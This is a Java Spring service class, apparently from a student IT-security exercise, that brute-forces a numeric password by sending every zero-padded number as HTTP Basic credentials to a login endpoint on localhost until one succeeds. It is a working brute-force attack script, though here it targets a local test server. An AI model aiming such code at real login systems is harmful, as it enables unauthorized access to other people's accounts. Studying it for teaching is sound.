package com.java22d.itsakerhet.Services;

import lombok.Data;
import org.springframework.http.*;
import org.springframework.stereotype.Service;
import org.springframework.web.client.HttpClientErrorException;
import org.springframework.web.client.RestTemplate;

import java.util.Base64;

@Service
@Data
public class BruteForceService {

    private int currentAttempt = 0;
    private int maxAttempt;
    private boolean isBruteForcing = false;


    public void startBruteForce(int numerals) {
        this.isBruteForcing = true;
        this.currentAttempt = 0;
        this.maxAttempt = (int) Math.pow(10, numerals) - 1;
        System.out.println("Starting integer breaker");

        while (isBruteForcing && currentAttempt <= maxAttempt) {
            String passwordAttempt = String.format("%0" + numerals + "d", currentAttempt);
            if (postUsingRestTemplate("user", passwordAttempt)) {
                System.out.println((postUsingRestTemplate("user", passwordAttempt)));
                stopBruteForce();
                System.out.println("Password cracked: " + passwordAttempt);
            }

            currentAttempt++;
            System.out.println("Current attempt is: "+currentAttempt);
        }

        if (currentAttempt > maxAttempt) {
            System.out.println("Brute force finished without finding the password.");
        }
    }

    public boolean postUsingRestTemplate(String username, String password) {

        System.out.println("Using username: " + username + " and password: " + password);
        RestTemplate restTemplate = new RestTemplate();
        String url = "http://localhost:8080/login/";
        System.out.println("DEBUG: Använder username: "+username+" och password: "+password);
        HttpHeaders headers = new HttpHeaders();

    // Enkodar till basic auth. Ska vi köra json behöver vi göra en ny validering av användaren.
        String authValue = "Basic " + Base64.getEncoder().encodeToString((username + ":" + password).getBytes());
        headers.set("Authorization", authValue);

        HttpEntity<String> entity = new HttpEntity<>(headers);

        ResponseEntity<String> response;
        try {
            response = restTemplate.exchange(url, HttpMethod.POST, entity, String.class);
        } catch (HttpClientErrorException e) {
            System.out.println("Response Status: " + e.getStatusCode());
            System.out.println("Login failed due to client error"); // Debugging comment
            return false; // Login failed due to client error (likely unauthorized)
        }

        System.out.println("Response Status: " + response.getStatusCode());
        System.out.println("Response Body: " + response.getBody());

        if ("Logged in".equals(response.getBody())) {
            System.out.println("Successful login attempt with password: " + password); // Debugging comment
            return true; // Successful login
        } else {
            System.out.println("Failed login attempt with password: " + password); // Debugging comment
            return false; // Login failed
        }
    }





    public void stopBruteForce() {
        this.isBruteForcing = false;
        reset();
    }

    public void reset() {
        this.currentAttempt = 0;
    }

    public String getCurrentAttemptString() {
        if (!isBruteForcing) {
            return "N/A";
        }
        return String.format("%0" + String.valueOf(maxAttempt).length() + "d", currentAttempt);
    }

}
